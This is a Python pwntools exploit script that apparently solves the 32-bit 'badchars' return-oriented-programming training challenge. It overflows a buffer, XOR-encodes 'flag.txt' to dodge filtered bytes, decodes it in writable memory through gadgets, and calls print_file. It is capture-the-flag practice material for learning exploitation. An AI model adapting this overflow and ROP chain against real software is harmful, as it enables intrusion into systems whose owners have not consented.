from pwn import *

bin = './badchars32'
elf = ELF(bin)
p = process(bin)

offset = 44

# Gadgets (from your dump)
pop_esi_edi_ebp = 0x080485b9   # pop esi; pop edi; pop ebp; ret
mov_edi_esi     = 0x0804854f   # mov dword ptr [edi], esi; ret
pop_ebx         = 0x0804839d   # pop ebx; ret
pop_ebp         = 0x080485bb   # pop ebp; ret
xor_byte_ebp_bl = 0x08048547   # xor byte ptr [ebp], bl; ret

data = 0x804a018  # writable section (check vmmap!)

badchars = [ord('x'), ord('g'), ord('a'), ord('.')]

# Step 1: find XOR key that avoids badchars
plain = b"flag.txt"
key = None
encoded = None
for k in range(1, 256):
    enc = bytes([b ^ k for b in plain])
    if not any(c in badchars for c in enc):
        key, encoded = k, enc
        break
assert key is not None

log.info(f"Using XOR key: {key:#x}")
log.info(f"Encoded string: {encoded}")

payload  = b"A"*offset

# Step 2: write encoded string into .data
# Write 4 bytes at a time
payload += p32(pop_esi_edi_ebp)
payload += encoded[0:4]        # esi = first 4 encoded bytes
payload += p32(data)           # edi = .data
payload += p32(0xdeadbeef)     # ebp (junk)
payload += p32(mov_edi_esi)

payload += p32(pop_esi_edi_ebp)
payload += encoded[4:8]        # esi = second 4 encoded bytes
payload += p32(data+4)         # edi = .data+4
payload += p32(0xdeadbeef)     # ebp (junk)
payload += p32(mov_edi_esi)

# Step 3: load key into bl
payload += p32(pop_ebx)
payload += p32(key)            # EBX = key → BL = key

# Step 4: decode each byte in place
for i in range(len(plain)):
    payload += p32(pop_ebp)
    payload += p32(data+i)      # address of encoded byte
    payload += p32(xor_byte_ebp_bl)

# Step 5: call print_file("flag.txt")
payload += p32(elf.plt['print_file'])
payload += p32(elf.symbols['main'])  # return to main
payload += p32(data)                 # arg: pointer to decoded string

p.sendafter(b'> ', payload)
print(p.recvall(timeout=1).decode())
